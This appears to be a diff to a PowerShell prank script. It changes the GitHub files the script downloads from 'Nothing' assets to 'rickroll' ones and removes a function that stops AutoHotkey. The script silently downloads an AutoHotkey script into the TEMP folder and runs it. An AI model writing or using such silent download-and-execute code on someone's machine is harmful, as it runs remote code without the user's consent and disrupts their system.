@@ -37,15 +37,10 @@ function Run-AutoHotkeyScript {
     Start-Process -FilePath "AutoHotkey.exe" -ArgumentList $scriptPath -NoNewWindow -PassThru
 }
 
-# Function to stop an AutoHotkey script
-function Stop-AutoHotkeyScript {
-    Stop-Process -Name "AutoHotkey" -Force
-}
-
 # Function to download and run AHK file from GitHub
 function DownloadAndRun-AHKFromGitHub {
-    $ahkUrl = "https://raw.githubusercontent.com/BoothUA/RD_Scripts/main/Nothing.ahk"
-    $downloadPath = "$env:TEMP\nothing.ahk"
+    $ahkUrl = "https://raw.githubusercontent.com/BoothUA/RD_Scripts/main/rickroll.ahk"
+    $downloadPath = "$env:TEMP\rickroll.ahk"
 
     try {
         Invoke-WebRequest -Uri $ahkUrl -OutFile $downloadPath -UseBasicParsing
@@ -59,8 +54,8 @@ function DownloadAndRun-AHKFromGitHub {
 
 # Function to silently download the raw image file from GitHub
 function Download-ImageFromGitHub {
-    $imageUrl = "https://raw.githubusercontent.com/BoothUA/RD_Scripts/e30e22d41baf67ce7db80e39095c19cd5c184653/Nothing.jpg"
-    $downloadPath = "$env:TEMP\downloaded_image.jpg"
+    $imageUrl = "https://github.com/BoothUA/RD_Scripts/blob/0a27bcd045ef0c2e09f2be825a83484d175bcd2e/rickroll.jpg"
+    $downloadPath = "$env:TEMP\rickroll.jpg"
 
     try {
         Invoke-WebRequest -Uri $imageUrl -OutFile $downloadPath -UseBasicParsing
@@ -74,8 +69,8 @@ function Download-ImageFromGitHub {
 
 # Function to silently download the raw WAV file from GitHub
 function Download-AudioFromGitHub {
-    $audioUrl = "https://raw.githubusercontent.com/BoothUA/RD_Scripts/main/Nothing.wav"
-    $downloadPath = "$env:TEMP\nothing.wav"
+    $audioUrl = "https://github.com/BoothUA/RD_Scripts/blob/0a27bcd045ef0c2e09f2be825a83484d175bcd2e/rickroll.wav"
+    $downloadPath = "$env:TEMP\rickroll.wav"
 
     try {
         Invoke-WebRequest -Uri $audioUrl -OutFile $downloadPath -UseBasicParsing
